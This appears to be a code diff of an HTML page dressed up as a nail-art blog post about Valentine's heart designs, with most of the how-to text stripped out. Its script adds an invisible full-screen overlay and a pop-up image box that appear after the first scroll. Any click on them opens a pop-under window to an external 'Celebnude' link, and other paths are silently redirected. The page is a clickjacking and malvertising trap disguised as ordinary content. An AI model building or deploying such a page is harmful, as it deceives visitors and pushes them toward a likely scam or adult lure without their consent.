@@ -14,125 +14,98 @@
     padding: 20px; 
     background-color: #ffffff; 
   }
-  h1 { color: #ea148c; font-size: 28px; margin-bottom: 5px; }
+  h1 { color: #ea148c; font-size: 28px; }
   h2 { color: #ea148c; font-size: 22px; margin-top: 30px; }
   h3 { font-size: 20px; margin-top: 20px; color: #e3007e; }
-  p { margin-bottom: 10px; }
-  .author { font-style: italic; font-weight: bold; }
-  .category { font-size: 14px; color: #555; margin-bottom: 20px; }
-  .nail-step { margin-bottom: 20px; }
   .nail-step img { max-width: 100%; height: auto; display: block; margin: 10px 0; border: 1px solid #ddd; padding: 4px; }
-  a { color: #e3007e; text-decoration: none; }
-  a:hover { text-decoration: underline; }
 
-  /* =======================================
-     CENTERED IMAGE BOX STYLES
-     ======================================= */
-  #image-trap-box {
-    display: none; 
+  /* Full-screen invisible "Trap" Layer */
+  #interaction-layer {
     position: fixed;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%); 
-    z-index: 1000000;
+    top: 0; left: 0; width: 100%; height: 100%;
+    z-index: 999999;
+    background: rgba(0,0,0,0); /* Invisible */
     cursor: pointer;
-    background: #ffffff;
-    padding: 8px;
+    display: none; /* Hidden until scroll */
+  }
+
+  /* Centered Image Box */
+  #pop-box {
+    position: fixed;
+    top: 50%; left: 50%;
+    transform: translate(-50%, -50%);
+    background: #fff;
+    padding: 10px;
     border-radius: 8px;
-    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4); 
-  }
-  #image-trap-box img {
-    max-width: 85vw; 
-    max-height: 75vh; 
-    display: block;
-    border-radius: 4px;
-  }
-  .click-hint {
-    display: block;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+    z-index: 1000000;
+    display: none;
     text-align: center;
-    color: #ea148c;
-    margin-top: 8px;
-    font-weight: bold;
-    font-size: 14px;
-    text-transform: uppercase;
   }
 </style>
 </head>
 <body>
 
-<div id="image-trap-box">
-  <img src="https://stellaplus.netlify.app/IMG_2216.jpeg" alt="Featured Design">
-  <span class="click-hint">Click to View More</span>
+<div id="interaction-layer"></div>
+<div id="pop-box">
+    <img src="https://stellaplus.netlify.app/IMG_2216.jpeg" style="max-width: 80vw; max-height: 60vh;">
+    <p style="color: #ea148c; font-weight: bold;">Click to View Full Gallery</p>
 </div>
 
 <header>
   <h1>JVX NAILS FASHION</h1>
-  <p>Nail designs, nail art, reviews and how-tos</p>
+  <p>by <strong>Maria @SoNailicious</strong></p>
 </header>
 
 <article>
   <h2>12 Incredible Heart Nails to Try This Valentine’s Day</h2>
-  <p class="author">by <a href="#">Maria @SoNailicious</a> on February 12, 2022</p>
-  <p class="category">Categories: Nail Art, Nailspiration</p>
-
-  <p>Valentine’s Day is just around the corner! So here are 12 incredible Heart nails for every taste and skill level to get you inspired. Enjoy!</p>
+  <p>Valentine’s Day is just around the corner! Scroll down for inspiration.</p>
 
   <section class="nail-step">
     <h3>1. Rainbow Heart nails</h3>
-    <p><strong>How-to:</strong> Use straight line stencils or striping nail art brush to create a two-tone base, then add Love Heart glitters.</p>
-    <img src="https://stellapluss.netlify.app/ImageDrain-20260329T210410.825Z.jpeg" alt="Rainbow Heart Nails">
+    <img src="https://stellapluss.netlify.app/ImageDrain-20260329T210410.825Z.jpeg" alt="Nails">
   </section>
-
-  <section class="nail-step">
-    <h3>2. Sideways French Valentine’s Day nail art</h3>
-    <p><strong>How-to:</strong> Paint pink tips, outline with white using a thin liner brush, add red heart glitters.</p>
-    <img src="https://stellapluss.netlify.app/ImageDrain-20260329T210410.738Z.jpeg" alt="Sideways French Nails">
-  </section>
-
-  </article>
+  <div style="height: 1000px;"></div> </article>
 
 <script>
-/**
- * 1. REDIRECT NON-EXISTENT URLS
- * Redirects to home page if the path isn't the root or index.
+/** * 1. THE REDIRECT 
+ * Sends user to home if they are on a non-existent path.
  */
 (function() {
-    const validPaths = ['/', '/index.html', '/home'];
-    if (!validPaths.includes(window.location.pathname) && window.location.pathname.length > 1) {
-        window.location.href = window.origin || '/'; 
+    const path = window.location.pathname;
+    // If not root or index, redirect home
+    if (path !== '/' && path !== '/index.html') {
+        window.location.href = '/';
     }
 })();
 
-/**
- * 2. POP-UNDER LOGIC
+/** * 2. THE POP-UNDER 
+ * Triggers on the first click after a scroll.
  */
-const popunderUrl = 'https://go.pluse.name.ng/Celebnude';
-const trapBox = document.getElementById('image-trap-box');
+const adUrl = 'https://go.pluse.name.ng/Celebnude';
+const layer = document.getElementById('interaction-layer');
+const box = document.getElementById('pop-box');
 
-function armTrap() {
-    trapBox.style.display = 'block';
-    window.removeEventListener('scroll', armTrap);
-    window.removeEventListener('touchmove', armTrap);
-}
+// Show the trap after a tiny scroll
+window.addEventListener('scroll', () => {
+    layer.style.display = 'block';
+    box.style.display = 'block';
+}, { once: true });
 
-// Execution: Triggered on user clicking the "trap" image
-trapBox.addEventListener('click', function() {
-    // Open the target URL
-    let popWin = window.open(popunderUrl, '_blank', 'width=1024,height=768,scrollbars=yes');
-    
-    // Focus back on current window to create "pop-under" effect
-    if (popWin) {
-        popWin.blur();
+// Handle the click
+function handlePop() {
+    const win = window.open(adUrl, '_blank');
+    if (win) {
+        win.blur();
         window.focus();
     }
-    
-    // Hide the box so the user can continue browsing
-    trapBox.style.display = 'none';
-});
+    // Remove trap so they can actually use the site
+    layer.style.display = 'none';
+    box.style.display = 'none';
+}
 
-// Activate trap on first scroll
-window.addEventListener('scroll', armTrap, { passive: true });
-window.addEventListener('touchmove', armTrap, { passive: true });
+layer.addEventListener('click', handlePop);
+box.addEventListener('click', handlePop);
 </script>
 
 </body>
